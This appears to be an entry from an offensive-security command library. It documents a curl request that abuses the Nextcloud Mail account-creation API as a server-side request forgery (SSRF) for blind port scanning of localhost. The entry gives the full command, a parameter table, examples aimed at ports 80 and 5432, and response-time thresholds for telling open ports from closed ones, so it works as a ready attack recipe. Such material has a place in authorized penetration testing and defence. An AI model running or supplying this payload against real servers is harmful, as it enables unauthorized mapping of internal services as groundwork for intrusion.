---
id: cmd-2
data: >-
  curl -X POST https://nextcloud.example.com/apps/mail/api/accounts -H
  "Content-Type: application/json" -H "Cookie: your_session_cookie" -d
  '{"imapHost":"127.0.0.1","imapPort":80,"imapSslMode":"none","imapUser":"user@example.com","imapPassword":"pass","smtpSslMode":"none","smtpUser":"user@example.com","smtpPassword":"pass","accountName":"user@example.com","emailAddress":"user@example.com"}'
tags:
  - ssrf
  - port-scan
type: command
output: null
executor: curl
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:39:09.953Z'
verified: false
validated: true
submitted: true
---
# modified-port-scan-payload

## Command

```bash
curl -X POST https://nextcloud.example.com/apps/mail/api/accounts \
  -H "Content-Type: application/json" \
  -H "Cookie: your_session_cookie" \
  -d '{"imapHost":"127.0.0.1","imapPort":80,"imapSslMode":"none","imapUser":"user@example.com","imapPassword":"pass","smtpSslMode":"none","smtpUser":"user@example.com","smtpPassword":"pass","accountName":"user@example.com","emailAddress":"user@example.com"}'
```

## Description

Modified JSON payload for POST request to attempt SSRF connection to localhost on a specific port, used for blind port scanning by varying imapPort and observing response times.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP method | Yes |
| `-H "Content-Type: application/json"` | Sets JSON content type | Yes |
| `-H "Cookie: your_session_cookie"` | Authentication cookie | Yes |
| `-d '{JSON}'` | Payload with localhost imapHost and variable port | Yes |
| `imapHost` | Set to '127.0.0.1' for localhost | Yes |
| `imapPort` | Variable port to scan (e.g., 80) | Yes |
| `imapSslMode` | 'none' to avoid SSL delays | Yes |
| `smtpSslMode` | 'none' for consistency | Yes |

## Examples

### Basic Usage

```bash
# Scan port 80
curl -X POST https://nextcloud.example.com/apps/mail/api/accounts -H "Content-Type: application/json" -H "Cookie: session=abc" -d '{"imapHost":"127.0.0.1","imapPort":80,"imapSslMode":"none",...}'
```

### Advanced Usage

```bash
# Scan port 5432 (PostgreSQL)
curl -X POST https://nextcloud.example.com/apps/mail/api/accounts -H "Content-Type: application/json" -H "Cookie: session=abc" -d '{"imapHost":"127.0.0.1","imapPort":5432,"imapSslMode":"none",...}'
```

## Expected Output

Server JSON response; key indicator is response time: <100ms (closed), >1000ms (open port).

## Related

- [[commands/post-mail-account-creation-request]]
- [[procedures/Manual-Port-Scan-on-Localhost]]
